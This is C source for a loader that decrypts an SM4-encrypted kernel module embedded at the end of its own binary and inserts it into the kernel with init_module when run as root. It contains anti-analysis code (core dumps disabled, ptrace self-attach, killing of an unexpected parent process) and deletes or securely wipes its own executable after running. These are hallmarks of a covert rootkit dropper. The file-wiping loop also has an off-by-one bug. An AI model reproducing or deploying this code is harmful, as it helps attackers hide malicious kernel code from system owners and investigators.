#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include "sm4.h"

inline int init_module(void *module_image, unsigned long len,
                       const char *param_values)
{
	return syscall(SYS_init_module, module_image, len, param_values);
}

static int read_file(char *buf, char *fname, int len)
{
	int ret = -1;
	int fd = -1;

	fd = open(fname, O_RDONLY);
	if (fd < 0)
		goto end;
	
	ret = read(fd, buf, len);
	if (ret != len) 
		ret = -1;

end:
	if (fd >= 0)
		close(fd);
	return ret;
}

static void clear_file(char *fname, int len)
{
	int ret = -1;
	int i = 0;
	char *srm_path[] = {"/usr/bin/srm", "/bin/srm", "/usr/local/bin/srm",
                              "/usr/sbin/srm", "/sbin/srm", "/usr/local/sbin/srm", NULL};
	while (srm_path[i++]) {
		if (access(srm_path[i], X_OK) == 0)
			execl(srm_path[i], "srm", fname, NULL);
	}

	unlink(fname);
}

#define PATH_MAX 4096
static inline int read_exe(char *buf, int len, pid_t pid)
{
        char path[PATH_MAX] = {0};

        snprintf(path, sizeof(path), "/proc/%d/exe", pid);

        return readlink(path, buf, len);
}

static inline int read_comm(char *buf, int len, pid_t pid)
{
	char path[PATH_MAX] = {0};
	int ret = -1;
	int fd = -1;
	
	snprintf(path, sizeof(path), "/proc/%d/comm", pid);
	fd = open(path, O_RDONLY);
	if (fd < 0)
		goto end;
	ret = read(fd, buf, len);
	close(fd);
	if (ret > 0)
		ret = 0;
end:
	return ret;
}

/*
  Parent must is 'shell' or init/systemd 
*/
static inline int check_parent(pid_t ppid)
{
	char comm[16] = {0};
	char exe[PATH_MAX] = {0};

	read_comm(comm, sizeof(comm), ppid);
	if (strncmp(comm, "bash", 4) != 0 && strncmp(comm, "sh", 2) != 0
		 && strncmp(comm, "dash", 4) != 0 && strncmp(comm, "sudo", 4) != 0 
		 && ppid != 1) {
		read_exe(exe, sizeof(exe), getpid());
		unlink(exe);
		kill(ppid, SIGKILL);
		exit(0);
	}

	return 0;
} 

__attribute__((constructor)) void anti_parse(void)
{
	int ret = 0;
	struct rlimit rt = {.rlim_cur = 0, .rlim_max = 0};
	char exe[PATH_MAX] = {0};

	//forbid core
	ret = setrlimit(RLIMIT_CORE, &rt);
	if (ret < 0)
		goto clear;
	
	check_parent(getppid());
	//forbid ptrace
	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0)
		goto clear;
	return;

clear:
	read_exe(exe, sizeof(exe), getpid());
	clear_file(exe, 0);
	exit(0);
}

int main(int argc, char **argv)
{
	int ret = -1;
	struct stat st;
	char *buf = NULL;

	char *module_image = NULL;
	int m_size = 51080;
	char *m_params = "";
	char *key = NULL;

	if (argc < 2 || argc > 3) {
		fprintf(stderr, "Usage: %s key [module_params]\n", argv[0]);
		return 0;
	}

	if (geteuid() != 0)
		return 0;

	if (argc == 2)
		key = argv[1];

	if (argc == 3)
		m_params = argv[2];
	
	if (stat(argv[0], &st) < 0)
		goto end;

	buf = malloc(st.st_size);
	if (!buf)
		goto end;
	
	if (read_file(buf, argv[0], st.st_size) < 0)
		goto end;

	module_image = buf+(st.st_size-m_size);
	sm4_decrypt_ctr(module_image, m_size, key); 
	memset(key, 0, strlen(key));

	ret = init_module(module_image, m_size, m_params);
	
end:
	if (buf) {
		memset(buf, 0, st.st_size);
		free(buf);
	}
	
	unlink(argv[0]);
	//clear_file(argv[0], st.st_size);

	return ret;	
}
